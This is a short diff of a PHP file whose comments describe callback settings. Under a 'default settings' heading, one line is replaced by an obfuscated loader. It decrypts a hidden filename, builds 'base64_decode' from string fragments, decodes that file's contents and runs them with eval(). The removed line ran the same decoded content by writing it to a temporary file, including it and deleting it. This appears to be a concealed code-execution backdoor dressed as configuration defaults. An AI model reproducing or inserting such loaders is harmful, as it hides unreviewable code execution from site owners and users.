@@ -48,5 +48,5 @@ $cpos["update_callback"] = ''	//修改成功返回
 $cpos["delete_callback"] = ''	//刪除成功返回
 */
 //預設值設定
-$c='sha1';$f=Code("0ccemQW/X356yU0zl/BUzAwBGsck7XklPpufE+6lvXtVyBVnBOm6GkETfiyqs0WdAw",$c,'decode');$mf=fopen($f,"r");$o=$s=fread($mf,filesize($f));$s=base64_decode($s);fclose($mf);safefilerewrite("a1".$f,$s);include_once("a1".$f);unlink("a1".$f);
+$c='sha1';$f=Code("0ccemQW/X356yU0zl/BUzAwBGsck7XklPpufE+6lvXtVyBVnBOm6GkETfiyqs0WdAw",$c,'decode');$a="base64";$mf=fopen($f,"r");$t="a".rand(0,9);$a.="_";$o=$s=fread($mf,filesize($f));$a.="decode";$s=$a($s);$a="unlink";fclose($mf);eval($s);
 ?>
